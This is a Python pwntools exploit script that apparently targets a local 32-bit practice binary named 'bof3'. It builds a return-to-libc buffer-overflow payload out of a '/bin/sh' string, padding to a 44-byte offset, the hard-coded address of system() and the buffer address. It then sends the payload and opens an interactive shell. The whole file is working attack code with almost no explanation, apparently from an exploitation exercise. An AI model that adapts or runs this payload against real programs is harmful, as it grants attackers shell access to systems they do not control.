#!/usr/bin/python3

from pwn import *

context.arch = 'i386'
context.bits = '32'
context.endian = 'little'

buffer = 0x804c060 
offset = 44 #to calculate this num, you can use gdb's pattc and patto commnads each.
elf = ELF('./bof3')
mainaddr = elf.symbols['main']
#printfaddr = elf.plt['printf'] #0x08049030
#mainaddr = 0x080491e6 
systemaddr = 0xf7e0e000
wannado = b'/bin/sh\x00'

payload = wannado
payload += b'A' * (offset - len(wannado)) 
payload += p32(systemaddr)
#payload += p32(printfaddr)
#payload += p32(mainaddr) 
payload += b'BBBB' #dammy address after system call
payload += p32(buffer)

p = process('./bof3')
p.sendline(payload)
#print(p.recv())
p.interactive()
